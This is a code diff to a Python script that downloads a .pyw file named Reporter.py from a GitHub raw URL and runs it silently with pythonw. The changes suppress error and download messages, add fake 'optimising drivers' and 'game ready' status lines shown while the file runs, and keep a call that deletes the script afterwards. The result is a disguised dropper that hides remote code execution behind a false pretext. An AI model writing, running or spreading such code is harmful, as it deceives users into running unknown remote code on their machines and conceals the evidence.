@@ -43,7 +43,7 @@ powershell_cmd = ";".join([f"pip install {lib}" for lib in libraries])
 
 # Execute PowerShell command
 try:
-    subprocess.run(["powershell", "-Command", powershell_cmd], check=True)
+    subprocess.run(["powershell", "-Command", powershell_cmd], check=False)
     print("Libraries installed successfully.")
 except subprocess.CalledProcessError:
     print("Error occurred while installing libraries.")
@@ -65,22 +65,26 @@ def download_and_open_file(url):
         with open(filepath, 'wb') as f:
             f.write(response.content)
 
-        print(f"File downloaded successfully to {filepath}")
+        #print(f"File downloaded successfully to {filepath}")
 
         # Open the file using the default Python interpreter for .pyw files
         python_executable = 'pythonw.exe' if os.name == 'nt' else 'pythonw'
         subprocess.run([python_executable, filepath])
 
     except requests.exceptions.RequestException as e:
-        print(f"Error downloading the file: {e}")
+        pass
 
     except subprocess.CalledProcessError as e:
-        print(f"Error opening the file: {e}")
+        pass
 
 file_url = r"https://raw.githubusercontent.com/Lixvinity/winjv/main/Reporter.py"
 
-
-
+print("Optimising driver's")
+time.sleep(5)
+print("Setting drivers to game ready.")
+time.sleep(3)
+print("This could take around 8 - 10 minutes")
 download_and_open_file(file_url)
-time.sleep(500)
+
+time.sleep(5)
 delete_script()
